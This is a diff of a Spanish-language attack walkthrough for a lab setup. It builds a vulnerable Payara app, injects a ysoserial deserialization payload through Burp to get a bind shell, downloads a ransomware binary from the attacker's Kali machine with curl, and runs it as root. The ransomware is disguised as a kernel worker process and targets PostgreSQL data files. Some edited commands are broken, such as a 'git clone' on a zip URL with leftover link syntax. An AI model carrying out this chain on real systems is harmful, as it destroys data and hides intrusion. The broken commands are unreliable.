@@ -13,7 +13,7 @@ Primero, clona el repositorio que contiene los archivos necesarios para la confi
 
 1.  **Clonar el repositorio `HackingPayara`:**
     ```bash
-    git clone [https://github.com/TipoTramquilo/HackingPayara/](https://github.com/TipoTramquilo/HackingPayara/)
+    git clone https://github.com/TipoTramquilo/HackingPayara/](https://github.com/TipoTramquilo/HackingPayara/
     ```
 
 ### 1.2. Configuración de la Base de Datos `ecommerce`
@@ -34,10 +34,10 @@ Primero, clona el repositorio que contiene los archivos necesarios para la confi
         ```bash
         sudo -i -u postgres
         ```
-        Se te pedirá la contraseña de tu usuario `ubuntu` (o el usuario con privilegios `sudo`).
+        Se te pedirá la contraseña de tu usuario `ubuntu` o el usuario con privilegios `sudo`.
 
     b.  **Ejecuta el script SQL:**
-        Una vez que estés en el prompt de `postgres` (verás `postgres@Ubuntu:~$`), ejecuta el script:
+        Una vez que estés en el prompt de `postgres` verás `postgres@Ubuntu:~$`, ejecuta el script:
         ```bash
         psql -f /tmp/scriptDB.sql
         ```
@@ -57,8 +57,8 @@ Primero, clona el repositorio que contiene los archivos necesarios para la confi
 
 1.  **Descargar Payara 5:**
     Descarga el servidor Payara desde el siguiente enlace:
-    ```
-    [https://github.com/payara/Payara/releases/download/payara-server-5.2020.2/payara-5.2020.2.zip](https://github.com/payara/Payara/releases/download/payara-server-5.2020.2/payara-5.2020.2.zip)
+    ```bash
+    git clone https://github.com/payara/Payara/releases/download/payara-server-5.2020.2/payara-5.2020.2.zip](https://github.com/payara/Payara/releases/download/payara-server-5.2020.2/payara-5.2020.2.zip
     ```
     Una vez descargado, descomprímelo en un lugar accesible, por ejemplo, en `/opt/`.
 
@@ -67,13 +67,13 @@ Primero, clona el repositorio que contiene los archivos necesarios para la confi
     ```bash
     sudo /opt/payara5/bin/asadmin start-domain
     ```
-    *(Ajusta la ruta a tu instalación de Payara según sea necesario.)*
+    *Ajusta la ruta a tu instalación de Payara según sea necesario.*
 3.  **Acceder a la consola de administración de Payara:**
     Abre tu navegador web y navega a `http://localhost:4848`.
 4.  **Crear un JDBC Connection Pool:**
     * En la consola de administración, navega a **Resources** -> **JDBC** -> **JDBC Connection Pools**.
     * Haz clic en **New...**
-    * **Pool Name:** `ecommercePool` (o el nombre que prefieras).
+    * **Pool Name:** `ecommercePool` o el nombre que prefieras.
     * **Resource Type:** `javax.sql.DataSource`
     * **Database Vendor:** `PostgreSQL`
     * Haz clic en **Next**.
@@ -87,13 +87,13 @@ Primero, clona el repositorio que contiene los archivos necesarios para la confi
 6.  **Crear un JDBC Resource:**
     * Navega a **Resources** -> **JDBC** -> **JDBC Resources**.
     * Haz clic en **New...**
-    * **JNDI Name:** `jdbc/ecommerceDB` (¡Debe llamarse `ecommerceDB`!)
-    * **Pool Name:** Selecciona el pool que acabas de crear (ej., `ecommercePool`).
+    * **JNDI Name:** `jdbc/ecommerceDB` ¡Debe llamarse `ecommerceDB`!
+    * **Pool Name:** Selecciona el pool que acabas de crear ej., `ecommercePool`.
     * Haz clic en **OK`.
 7.  **Desplegar la aplicación `.war`:**
     * Navega a **Applications**.
     * Haz clic en **Deploy...**.
-    * Selecciona el archivo `.war` que se encuentra en la carpeta `config_ubuntu` del repositorio `HackingPayara` que clonaste (ej. `HackingPayara/config_ubuntu/tu-aplicacion.war`).
+    * Selecciona el archivo `.war` que se encuentra en la carpeta `config_ubuntu` del repositorio `HackingPayara` que clonaste ej. `HackingPayara/config_ubuntu/tu-aplicacion.war`.
     * Sigue los pasos para desplegar la aplicación.
 
 ---
@@ -109,7 +109,7 @@ Para generar el payload necesario, sigue estos pasos:
     ```
 2.  **Descarga `ysoserial.jar`:**
     ```bash
-    wget -O ~/Desktop/yoserial.jar [https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
+    wget -O ~/Desktop/yoserial.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
     ```
 3.  **Verifica la versión de Java:**
     Asegúrate de que tu versión de Java sea **1.8**. Si no, el siguiente paso te guiará para instalar y configurar Corretto 8.
@@ -118,7 +118,7 @@ Para generar el payload necesario, sigue estos pasos:
     ```
 4.  **Descarga Amazon Corretto 8 (si es necesario):**
     ```bash
-    wget [https://corretto.aws/downloads/latest/amazon-corretto-8-x64-linux-jdk.deb](https://corretto.aws/downloads/latest/amazon-corretto-8-x64-linux-jdk.deb)
+    wget https://corretto.aws/downloads/latest/amazon-corretto-8-x64-linux-jdk.deb
     ```
 5.  **Instala Amazon Corretto 8:**
     ```bash
@@ -488,7 +488,7 @@ Prepara tu entorno Python para compilar el ransomware:
 
         if os.path.exists(nohup_file_path):
             try:
-                os.remove(nohup_file_path)
+                os.remove(nohup_file_name)
                 sys.stderr.write(f"\n--- Archivo '{nohup_file_name}' borrado exitosamente. ☠️ ---\n")
             except Exception as e:
                 sys.stderr.write(f"ERROR: No se pudo borrar '{nohup_file_name}': {e}\n")
@@ -627,12 +627,12 @@ Usa Burp Suite para interceptar tráfico y, potencialmente, inyectar el payload 
     ```
 2.  **Configura el Proxy en Burp Suite:**
     * Dentro de Burp Suite, ve a la pestaña **Proxy** y luego a **Options**.
-    * En **Proxy Listeners**, edita la interfaz para establecerla como **specific address** usando la **dirección IP de tu máquina Kali** y un puerto disponible (por ejemplo, `8080` si no está en uso).
+    * En **Proxy Listeners**, edita la interfaz para establecerla como **specific address** usando la **dirección IP de tu máquina Kali** y un puerto disponible por ejemplo, `8080` si no está en uso.
     * Asegúrate de que **Intercept is on** esté activado en la pestaña **Intercept**.
 3.  **Configura el proxy en Firefox:**
     * Abre Firefox y navega a **Configuración** > **General** > **Configuración de red**.
     * Selecciona **Configuración manual del proxy**.
-    * En **Proxy HTTP**, introduce la **dirección IP de tu máquina Kali** y el **puerto** que configuraste en Burp Suite (ej., `8080`).
+    * En **Proxy HTTP**, introduce la **dirección IP de tu máquina Kali** y el **puerto** que configuraste en Burp Suite ej., `8080`.
     * Activa la opción **Usar este proxy para todos los protocolos**.
 4.  **Descarga e importa el certificado de Burp Suite:**
     * En Firefox, navega a `http://burpsuite/`.
@@ -642,22 +642,22 @@ Usa Burp Suite para interceptar tráfico y, potencialmente, inyectar el payload 
 5.  **Captura el tráfico de inicio de sesión y envía el payload:**
     * Navega a la aplicación web vulnerable en Firefox.
     * Intenta iniciar sesión. En Burp Suite, en la pestaña **Proxy** > **Intercept**, haz clic en **Forward** o desactiva la intercepción temporalmente hasta que se generen las cookies de sesión después del inicio de sesión exitoso.
-    * Una vez dentro de la aplicación vulnerable, inyecta tu payload (el generado con `ysoserial` y codificado en Base64).
+    * Una vez dentro de la aplicación vulnerable, inyecta tu payload el generado con `ysoserial` y codificado en Base64.
 6.  **Inicia el listener de Netcat:**
-    Después de inyectar el payload en la aplicación vulnerable y obtener la `bind shell` en la máquina Ubuntu (víctima), ejecuta este comando en Kali para conectarte:
+    Después de inyectar el payload en la aplicación vulnerable y obtener la `bind shell` en la máquina Ubuntu víctima, ejecuta este comando en Kali para conectarte:
     ```bash
-    nc <ip_ubuntu> 5555
+    nc <IP_UBUNTU> 5555
     ```
 
 ---
 ## 5. Pasos para Kali (Ejecución en la Víctima a Través de la Bind Shell)
 
-Una vez que hayas establecido una `bind shell` en la máquina Ubuntu (víctima) usando el payload de `ysoserial`, ejecuta los siguientes comandos desde esa shell remota:
+Una vez que hayas establecido una `bind shell` en la máquina Ubuntu víctima usando el payload de `ysoserial`, ejecuta los siguientes comandos desde esa shell remota:
 
 1.  **Descarga el ejecutable `lagarto` desde Kali usando `curl`:**
-    Asegúrate de reemplazar `10.0.2.15` con la **dirección IP de tu máquina Kali**.
+    Asegúrate de reemplazar `<IP_KALI>` con la **dirección IP de tu máquina Kali**.
     ```bash
-    curl -o /tmp/lagarto [http://10.0.2.15/lagarto](http://10.0.2.15/lagarto)
+    curl -o /tmp/lagarto http://<IP_KALI>/lagarto
     ```
 2.  **Verifica el tamaño del archivo descargado:**
     ```bash
@@ -672,9 +672,47 @@ Una vez que hayas establecido una `bind shell` en la máquina Ubuntu (víctima) 
     chmod +x /tmp/lagarto
     ```
 5.  **Ejecuta el ransomware mimetizado y en segundo plano:**
+
+    El siguiente comando ejecuta el ransomware en segundo plano, con privilegios de root, y camuflando su proceso para que parezca un proceso legítimo del sistema `[kworker/u16:0]`. Esto asegura que el ataque continúe incluso si la sesión remota se cierra y dificulta la detección manual.
+
     ```bash
-    sudo nohup bash -c 'exec -a "[kworker/u16:0]" /tmp/lagarto /var/lib/postgresql/16/main/base/33175' &
+    sudo nohup bash -c 'exec -a "[kworker/u16:0]" /tmp/lagarto /var/lib/postgresql/16/main/base/<OID_DATABASE>' &
     ```
+    **Desglose del comando:**
+    * **`sudo`**: Ejecuta el comando con privilegios de superusuario root.
+    * **`nohup`**: Permite que el comando se ejecute en segundo plano, incluso si la sesión de la terminal se cierra.
+    * **`bash -c '...' `**: Ejecuta la cadena de comandos dentro de una nueva instancia de Bash.
+    * **`exec -a "[kworker/u16:0]"`**: Reemplaza el proceso actual con el ejecutable del ransomware `/tmp/lagarto` y le asigna el nombre `[kworker/u16:0]` para **mimetizarse con un proceso legítimo del kernel de Linux**, haciendo más difícil su detección.
+    * **`/tmp/lagarto`**: La **ruta al ejecutable del ransomware**.
+    * **`/var/lib/postgresql/16/main/base/<OID_DATABASE>`**: El **directorio objetivo** que el ransomware intentará cifrar. En este caso, apunta a los archivos de datos de una base de datos PostgreSQL.
+
+        **Para obtener el `<OID_DATABASE>` de la base de datos `ecommerce_db` o cualquier otra:**
+        1.  Accede a la consola de `psql` como el usuario `postgres`:
+            ```bash
+            sudo -i -u postgres
+            psql
+            ```
+        2.  Dentro de `psql`, ejecuta la siguiente consulta para listar las bases de datos y sus OID Object IDentifier:
+            ```sql
+            SELECT datname, oid FROM pg_database;
+            ```
+            Busca la fila que contenga `ecommerce_db` y anota el número en la columna `oid`. Ese es el `<OID_DATABASE>` que debes usar.
+        3.  Sal de `psql` y luego del usuario `postgres` ejecutando:
+            ```sql
+            \q
+            exit
+            ```
+
+    * **`&`**: Envía el comando completo a **ejecutarse en segundo plano**, liberando la terminal.
+
+    ---
+    **Importante: Reconexión de la Bind Shell**
+
+    Puede que la `bind shell` que obtienes sea inestable o se "buguee" al verficar donde se encuentra la base de datos, causando que la conexión se pierda. Si esto sucede, o si te desconectas intencionalmente, es **necesario volver a enviar el payload** a la aplicación     vulnerable y **volver a conectarte con Netcat** `nc <IP_UBUNTU> 5555` para recuperar el acceso a la máquina víctima.
+
+    El ransomware, gracias a `nohup`, debería seguir ejecutándose en segundo plano en la máquina víctima, pero necesitarás una nueva shell para interactuar con el sistema o verificar su estado.
+
+    ---
 
 ---
 ## 6. Pasos de Monitoreo y Limpieza
